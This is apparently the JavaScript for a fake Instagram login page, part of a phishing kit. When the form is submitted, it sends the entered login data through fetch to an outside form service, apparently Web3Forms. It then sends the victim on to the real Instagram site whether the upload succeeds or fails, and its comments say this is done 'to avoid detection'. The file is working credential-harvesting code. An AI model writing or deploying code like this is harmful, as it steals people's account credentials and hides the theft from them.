document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // UI Feedback
        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.8';
        
        // Gather data
        const formData = new FormData(form);
        
        try {
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            const result = await response.json();
            
            if (result.success) {
                // Success! Redirect to real Instagram
                window.location.href = "https://www.instagram.com/";
            } else {
                // If Web3Forms fails, still redirect to avoid detection
                window.location.href = "https://www.instagram.com/";
            }
        } catch (error) {
            // Even if error, redirect
            window.location.href = "https://www.instagram.com/";
        }
    });
});